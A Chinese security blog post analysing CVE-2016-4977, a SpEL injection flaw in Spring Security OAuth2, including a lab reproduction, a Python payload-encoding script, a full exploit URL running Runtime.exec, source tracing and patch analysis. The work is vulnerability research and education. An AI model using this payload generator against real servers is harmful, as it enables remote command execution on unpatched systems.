
<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#202020">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
  
  
    <meta name="keywords" content="Web安全,Java,SpEL注入,Spring,">
  

  
    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
  
  
  
  <link rel="icon" type="image/x-icon" href="/1.jpg">
  
  <title>浅析Spring Security OAuth2之CVE-2016-4977 [ Mi1k7ea ]</title>
  
    <!-- stylesheets list from config.yml -->
    
      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
    
      <link rel="stylesheet" href="/css/xoxo.css">
    
  
</head>


<body>
  <div class="nav-container">
    <nav class="home-menu pure-menu pure-menu-horizontal">
  <a class="pure-menu-heading" href="/">
    
    <span class="title" style="text-transform:none">Mi1k7ea</span>
  </a>

  <ul class="pure-menu-list clearfix">
      
          
            
              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
            
          
      
          
            
              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
            
          
      
  </ul>
   
</nav>

  </div>

  <div class="container" id="content-outer">
    <div class="inner" id="content-inner">
      <div class="post-container">
  <article class="post" id="post">
    <header class="post-header text-center">
      <h1 class="title">
        浅析Spring Security OAuth2之CVE-2016-4977
      </h1>
      <span>
        
        <time class="time" datetime="2020-02-09T14:22:22.000Z">
        2020-02-09
      </time>
        
      </span>
      <span class="slash">/</span>
      <span class="post-meta">
      <span class="post-tags">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL注入/">SpEL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Spring/">Spring</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
      </span>
    </span>
      <!--<span class="slash">/</span>
      <span class="read">
      <span id="busuanzi_value_page_pv"></span> 点击
    </span>
      <span class="slash">/</span>-->
    </header>

    <div class="post-content">
      <h2 id="0x01-Spring-Security-OAuth2"><a href="#0x01-Spring-Security-OAuth2" class="headerlink" title="0x01 Spring Security OAuth2"></a>0x01 Spring Security OAuth2</h2><h3 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h3><p>OAuth 2.0是用于授权的行业标准协议，核心思路是通过各类认证手段（具体什么手段OAuth 2.0不关心）认证用户身份，并颁发token，使得第三方应用可以使用该token在限定时间、限定范围内访问指定资源。OAuth 2.0致力于简化客户端开发人员的工作，同时为Web应用程序、桌面应用程序、移动电话和客厅设备提供特定的授权流程。</p>
<p>OAuth在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”不能直接登录”服务提供商”，只能登录授权层，以此将用户与客户端区分开来。”客户端”登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。</p>
<p>“客户端”登录授权层以后，”服务提供商”根据令牌的权限范围和有效期，向”客户端”开放用户储存的资料。</p>
<p>校验流程如图：</p>
<p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/4.png" alt=""></p>
<p>具体的讲解可参考：<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">《理解OAuth 2.0》</a></p>
<h3 id="Spring-Security-OAuth2"><a href="#Spring-Security-OAuth2" class="headerlink" title="Spring Security OAuth2"></a>Spring Security OAuth2</h3><p>Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块，主要包含认证服务器和资源服务器这两大块的实现：</p>
<p>Spring Security OAuth2主要包含认证服务器和资源服务器这两大块的实现：</p>
<p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/5.png" alt=""></p>
<p>认证服务器主要包含了四种授权模式的实现和Token的生成与存储，我们也可以在认证服务器中自定义获取Token的方式；资源服务器主要是在Spring Security的过滤器链上加了OAuth2AuthenticationProcessingFilter过滤器，即使用OAuth2协议发放令牌认证的方式来保护我们的资源。</p>
<p>更多的参考官方文档即可。</p>
<h2 id="0x02-CVE-2016-4977"><a href="#0x02-CVE-2016-4977" class="headerlink" title="0x02 CVE-2016-4977"></a>0x02 CVE-2016-4977</h2><p>在Spring Security OAuth2的漏洞版本中，当用户使用<code>whitelabel views</code>来处理错误时，由于使用了SpEL表达式，攻击者在被授权的情况下可以通过构造恶意参数来RCE。</p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>2.0.0 to 2.0.9</li>
<li>1.0.0 to 1.0.5</li>
</ul>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulhub：<a href="https://vulhub.org/#/environments/spring/CVE-2016-4977/" target="_blank" rel="noopener">https://vulhub.org/#/environments/spring/CVE-2016-4977/</a></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问如下链接，使用admin:admin登录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/oauth/authorize?response_type=$&#123;123*456&#125;&amp;client_id=acme&amp;redirect_uri=http://test</span><br><span class="line">或</span><br><span class="line">http://your-ip:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;123*456&#125;</span><br></pre></td></tr></table></figure>
<p>在页面响应中会发现URL其中的参数的SpEL表达式会被解析，前面两个不同参数的注入在页面显示的报错信息也不一样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error=&quot;unsupported_response_type&quot;, error_description=&quot;Unsupported response types: [56088]&quot;</span><br><span class="line">或</span><br><span class="line">error=&quot;invalid_grant&quot;, error_description=&quot;Invalid redirect: 56088 does not match one of the registered values: [http://localhost]&quot;</span><br></pre></td></tr></table></figure>
<p>此时已证明是存在SpEL表达式注入漏洞了。下面就进行漏洞利用。</p>
<p>注意，如果直接将对应的参数改为恶意的SpEL表达式来尝试执行某些命令的话会发现大多数不能成功，原因可参考：<a href="https://x.hacking8.com/post-294.html" target="_blank" rel="noopener">Java Runtime.getRuntime().exec() 的那些payloads</a></p>
<p>这里直接用P神的脚本，原理是会用ord()函数将命令中的每个字符转换为ASCII码，再通过字符串拼接以及调用toString()函数来实现命令还原：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">message = input(<span class="string">'Enter message to encode:'</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">'$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)'</span> % ord(message[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   poc += <span class="string">'.concat(T(java.lang.Character).toString(%s))'</span> % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += <span class="string">')&#125;'</span></span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure>
<p>这里输入<code>touch /tmp/mi1k7ea</code>，生成如下内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;</span><br></pre></td></tr></table></figure>
<p>最后将该内容替换到前面URL的会被SpEL解析的参数中构造出最终的PoC：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;&amp;client_id=acme&amp;redirect_uri=http://test</span><br></pre></td></tr></table></figure>
<p>访问后页面显示如下：</p>
<p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/1.png" alt=""></p>
<p>到后台发现命令成功执行：</p>
<p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/2.png" alt=""></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里就不逐步调试分析了，直接看到关键的几个函数。</p>
<p>这里我们选择2.0.9版本的Spring Security Oauth的代码来分析。</p>
<p>由前面页面的显示知道，在Spring Security Oauth2中是使用了<code>whitelabel views</code>来处理错误的，而漏洞点正是出在这个错误的处理过程中。</p>
<p>接着我们找到对应的错误处理的源码路径：<a href="https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java</a></p>
<p>看到WhitelabelErrorEndpoint类中，其含有一个handlerError()函数用于处理错误，这里会获取请求中的error，将其转换为OAuth2Exception类型，然后调用getSummary()函数来获取错误信息并进行HTML编码后赋值给errorSummary变量，将该变量put进model中，最后用SpelView()来渲染：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Controller for displaying the error page for the authorization server.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Dave Syer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@FrameworkEndpoint</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WhitelabelErrorEndpoint</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ERROR = <span class="string">"&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;$&#123;errorSummary&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(<span class="string">"/oauth/error"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handleError</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">		Map&lt;String, Object&gt; model = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">		Object error = request.getAttribute(<span class="string">"error"</span>);</span><br><span class="line">		<span class="comment">// The error summary may contain malicious user input,</span></span><br><span class="line">		<span class="comment">// it needs to be escaped to prevent XSS</span></span><br><span class="line">		String errorSummary;</span><br><span class="line">		<span class="keyword">if</span> (error <span class="keyword">instanceof</span> OAuth2Exception) &#123;</span><br><span class="line">			OAuth2Exception oauthError = (OAuth2Exception) error;</span><br><span class="line">			errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			errorSummary = <span class="string">"Unknown error"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		model.put(<span class="string">"errorSummary"</span>, errorSummary);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> SpelView(ERROR), model);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里errorSummary变量的值就是获取的我们输入的恶意参数的值即恶意SpEL表达式，此时errorSummary变量值为前面生成的PoC的内容即<code>${T(java.lang.Runtime).getRuntime().exec(...)}</code>。</p>
<p>接着我们看下SpelView类的源码，路径为：<a href="https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Simple String template renderer.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpelView</span> <span class="keyword">implements</span> <span class="title">View</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">SpelView</span><span class="params">(String template)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.template = template;</span><br><span class="line">		<span class="keyword">this</span>.context.addPropertyAccessor(<span class="keyword">new</span> MapAccessor());</span><br><span class="line">		<span class="keyword">this</span>.helper = <span class="keyword">new</span> PropertyPlaceholderHelper(<span class="string">"$&#123;"</span>, <span class="string">"&#125;"</span>);</span><br><span class="line">		<span class="keyword">this</span>.resolver = <span class="keyword">new</span> PlaceholderResolver() &#123;</span><br><span class="line">			<span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholder</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">				Expression expression = parser.parseExpression(name);</span><br><span class="line">				Object value = expression.getValue(context);</span><br><span class="line">				<span class="keyword">return</span> value == <span class="keyword">null</span> ? <span class="keyword">null</span> : value.toString();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		...</span><br><span class="line">		String result = helper.replacePlaceholders(template, resolver);</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到以下两个函数：</p>
<ul>
<li>在SpelView类的构造函数中，传参是赋值给了template属性即模板，helper属性是PropertyPlaceholderHelper类型、其中的两个传参分别是包括表达式字符串的前缀和后缀字符串，resolver属性是规定了如何解析这个错误信息、这里看到是定义了resolvePlaceholder()函数，该函数是将传参定义为Expression类型的表达式，再调用<code>expression.getValue(context)</code>，这就是SpEL表达式解析的地方，也是漏洞最后执行的地方。</li>
<li>在render()函数中，负责渲染页面，这里会调用replacePlaceholders()函数来使用resolver属性作为解析器、template属性作为模板进行页面的解析渲染。</li>
</ul>
<p>在前面的ModelAndView类的构造函数中使用SpelView类来渲染页面，必然会调用到render()函数，而该函数调用了replacePlaceholders()函数。我们跟进该函数看看，路径为：<a href="https://github.com/spring-projects/spring-framework/blob/v4.1.4.RELEASE/spring-core/src/main/java/org/springframework/util/PropertyPlaceholderHelper.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-framework/blob/v4.1.4.RELEASE/spring-core/src/main/java/org/springframework/util/PropertyPlaceholderHelper.java</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces all placeholders of format &#123;<span class="doctag">@code</span> $&#123;name&#125;&#125; with the value returned</span></span><br><span class="line"><span class="comment"> * from the supplied &#123;<span class="doctag">@link</span> PlaceholderResolver&#125;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value the value containing the placeholders to be replaced</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> placeholderResolver the &#123;<span class="doctag">@code</span> PlaceholderResolver&#125; to use for replacement</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the supplied value with placeholders replaced inline</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replacePlaceholders</span><span class="params">(String value, PlaceholderResolver placeholderResolver)</span> </span>&#123;</span><br><span class="line">	Assert.notNull(value, <span class="string">"'value' must not be null"</span>);</span><br><span class="line">	<span class="keyword">return</span> parseStringValue(value, placeholderResolver, <span class="keyword">new</span> HashSet&lt;String&gt;());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">parseStringValue</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">		String strVal, PlaceholderResolver placeholderResolver, Set&lt;String&gt; visitedPlaceholders)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">			<span class="comment">// Recursive invocation, parsing placeholders contained in the placeholder key.</span></span><br><span class="line">			placeholder = parseStringValue(placeholder, placeholderResolver, visitedPlaceholders);</span><br><span class="line">			<span class="comment">// Now obtain the value for the fully resolved key...</span></span><br><span class="line">			String propVal = placeholderResolver.resolvePlaceholder(placeholder);</span><br><span class="line">               ...</span><br></pre></td></tr></table></figure>
<p>看到replacePlaceholders()函数中是直接调用了parseStringValue()函数来进一步解析；在parseStringValue()函数中，递归调用了自身以获取前面SpelView类实例helper属性的前缀和后缀字符串括起来的内容并赋值给placeholder变量，接着就调用了SpelView类实例resolver属性的resolvePlaceholder()函数来解析这个placeholder变量值即我们输入的恶意SpEL表达式，从而在resolvePlaceholder()函数中调用了<code>expression.getValue(context)</code>导致SpEL表达式注入漏洞的触发。</p>
<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看下2.0.10版本的补丁怎么打的：<a href="https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d#diff-1490000798a5128b354afb04c352773a" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d#diff-1490000798a5128b354afb04c352773a</a></p>
<p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/3.png" alt=""></p>
<blockquote>
<p>可以看到在<strong>第一次执行表达式之前</strong>程序将<code>$</code>替换成了由<code>RandomValueStringGenerator().generate()</code>生成的随机字符串，也就是<code>${errorSummary} -&gt; random{errorSummary}</code>，但是这个替换不是递归的，所以<code>${2334-1}</code>并没有变。</p>
<p>然后创建了一个<code>helper</code>使程序取<code>random{}</code>中的内容作为表达式，这样就使得<code>errorSummary</code>被作为表达式执行了，而<code>${2334-1}</code>因为不符合<code>random{}</code>这个形式所以没有被当作表达式，从而也就没有办法被执行了。</p>
<p>不过这个Patch有一个缺点：<code>RandomValueStringGenerator</code>生成的字符串虽然内容随机，但长度固定为6，所以存在暴力破解的可能性。</p>
</blockquote>
<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://blog.knownsec.com/2016/10/spring-security-oauth-rce/" target="_blank" rel="noopener">Spring Security OAuth RCE (CVE-2016-4977) 漏洞分析</a></p>

    </div>

  </article>
  <div class="toc-container">
    
  <div id="toc" class="toc-article">
    <strong class="toc-title">目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Spring-Security-OAuth2"><span class="toc-text">0x01 Spring Security OAuth2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth2"><span class="toc-text">OAuth2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring-Security-OAuth2"><span class="toc-text">Spring Security OAuth2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CVE-2016-4977"><span class="toc-text">0x02 CVE-2016-4977</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#补丁分析"><span class="toc-text">补丁分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-text">0x03 参考</span></a></li></ol>
  </div>


  </div>
</div>
<div class="copyright">
    <span>本作品采用</span>
    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
    <span>进行许可。 转载时请注明原文链接。</span>
</div>


  
    <div class="post-nav">
      <div class="post-nav-item post-nav-next">
        
          <span>〈 </span>
          <a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/" rel="next" title="浅析Spring Web Flow之CVE-2017-4971">
          浅析Spring Web Flow之CVE-2017-4971
          </a>
        
      </div>
  
      <div class="post-nav-item post-nav-prev">
          
          <a href="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/" rel="prev" title="浅析自动绑定漏洞之Spring MVC">
            浅析自动绑定漏洞之Spring MVC
          </a>
          <span>〉</span>
        
      </div>
    </div>
  


    </div>

    
    

  </div>
  <footer class="footer text-center">
    <div id="bottom-inner">
        <span>Copyright &copy; Mi1k7ea</span>  |  
        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
    </div>
</footer>

  

<script>
  (function(window, document, undefined) {

    var timer = null;

    function returnTop() {
      cancelAnimationFrame(timer);
      timer = requestAnimationFrame(function fn() {
        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
        if (oTop > 0) {
          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
          timer = requestAnimationFrame(fn);
        } else {
          cancelAnimationFrame(timer);
        }
      });
    }

    var hearts = [];
    window.requestAnimationFrame = (function() {
      return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.oRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function(callback) {
          setTimeout(callback, 1000 / 60);
        }
    })();
    init();

    function init() {
      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
      attachEvent();
      gameloop();
      addMenuEvent();
    }

    function gameloop() {
      for (var i = 0; i < hearts.length; i++) {
        if (hearts[i].alpha <= 0) {
          document.body.removeChild(hearts[i].el);
          hearts.splice(i, 1);
          continue;
        }
        hearts[i].y--;
        hearts[i].scale += 0.004;
        hearts[i].alpha -= 0.013;
        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
      }
      requestAnimationFrame(gameloop);
    }

    /**
     * 给logo设置点击事件
     * 
     * - 回到顶部
     * - 出现爱心
     */
    function attachEvent() {
      var old = typeof window.onclick === "function" && window.onclick;
      var logo = document.getElementById("logo");
      if (logo) {
        logo.onclick = function(event) {
          returnTop();
          old && old();
          createHeart(event);
        }
      }
      
    }

    function createHeart(event) {
      var d = document.createElement("div");
      d.className = "heart";
      hearts.push({
        el: d,
        x: event.clientX - 5,
        y: event.clientY - 5,
        scale: 1,
        alpha: 1,
        color: randomColor()
      });
      document.body.appendChild(d);
    }

    function css(css) {
      var style = document.createElement("style");
      style.type = "text/css";
      try {
        style.appendChild(document.createTextNode(css));
      } catch (ex) {
        style.styleSheet.cssText = css;
      }
      document.getElementsByTagName('head')[0].appendChild(style);
    }

    function randomColor() {
      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
      return "#F44336";
    }

    function addMenuEvent() {
      var menu = document.getElementById('menu-main-post');
      if (menu) {
        var toc = document.getElementById('toc');
        if (toc) {
          menu.onclick = function() {
            if (toc) {
              if (toc.style.display == 'block') {
                toc.style.display = 'none';
              } else {
                toc.style.display = 'block';
              }
            }
          };
        } else {
          menu.style.display = 'none';
        }
      }
    }

  })(window, document);
</script>

  



  
<script>
  (function(){
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();
</script>


</body>
</html>
